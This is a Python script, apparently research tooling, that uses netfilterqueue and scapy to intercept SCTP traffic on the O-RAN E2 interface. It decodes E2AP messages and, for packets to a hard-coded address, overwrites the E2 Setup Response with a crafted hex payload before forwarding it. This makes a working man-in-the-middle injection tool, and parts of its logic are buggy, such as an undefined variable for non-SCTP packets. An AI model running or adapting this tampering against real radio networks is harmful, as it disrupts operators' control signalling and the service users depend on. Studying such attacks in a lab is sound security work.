#!/usr/bin/env python3
import netfilterqueue
import scapy.all as scapy
import binascii

from pycrate_asn1dir import E2AP
from pycrate_asn1rt.utils import *
from binascii import hexlify, unhexlify 

def isE2setupResponse(packet):
#change to your packet source ip addr!
    if(packet.dst=='10.0.2.101'):
        return True

def isE2setupRequest(packet):
#change to ypur packet destination addr!
    if(packet.dst=='10.0.2.10'):
        return True

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    #print(scapy_packet.dst)
    print(scapy_packet.show())

    if scapy_packet.haslayer(scapy.TCP):
        del scapy_packet[scapy.TCP].chksum
        #del scapy_packet[scapy.TCP].len
    elif scapy_packet.haslayer(scapy.UDP):
        del scapy_packet[scapy.UDP].chksum
        del scapy_packet[scapy.UDP].len
    elif scapy_packet.haslayer(scapy.SCTP):
        #def if it's sctp protocol
        print("It's SCTP\n")
        sctp_packet = scapy_packet[scapy.SCTP]
        message_type=sctp_packet[scapy.SCTP].type
        print("Msgtype:",message_type)
        del scapy_packet[scapy.SCTP].chksum
        del scapy_packet[scapy.SCTP].len
    sctp_payload = sctp_packet[scapy.SCTP].payload
    print(sctp_packet)
    #print(str(scapy_packet))
    print("before:\n")       
    print("SCTP Payload:")
    print(hexlify(bytes(sctp_payload)))
    #print(type(sctp_payload))
    PDU = E2AP.E2AP_PDU_Descriptions.E2AP_PDU
    
    if scapy_packet[scapy.SCTP].haslayer('SCTPChunkData') and isE2setupRequest(scapy_packet):
        payload = scapy_packet[scapy.SCTP][1].data
        PDU.from_aper(payload)
        print("Old E2AP_PDU:\n")
        print(PDU.to_asn1())
        
               
    elif scapy_packet[scapy.SCTP].haslayer('SCTPChunkData') and isE2setupResponse(scapy_packet):
        payload = scapy_packet[scapy.SCTP][1].data
        PDU.from_aper(payload)
        print("Old E2AP_PDU:\n")
        print(PDU.to_asn1())
        try:
            new_payload=unhexlify('200100260000020004000744881014aacce0000900140002000640050000000000000640050000010000')
            #new_payload=unhexlify('3f8d42f3b68774a3e15d802ba8a91fc599d6b063416d2da45f41f93198728f1c3e5fa0672c499d12e24e')
            scapy_packet[scapy.SCTP][1].data=new_payload
            print("after:\n")       
            print("SCTP Payload:")
            print(hexlify(bytes(sctp_payload)))
            PDU.from_aper(new_payload)
            #rint("New E2AP_PDU:\n")
            print(PDU.to_asn1())
        except:
            pass
        
        
        
    

   

    
    del scapy_packet[scapy.IP].len
    #sctp_packet[scapy.SCTP].len=0
    del scapy_packet[scapy.IP].chksum
    
    
   
    packet.set_payload(bytes(scapy_packet)) 
    
    print(packet)
    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()



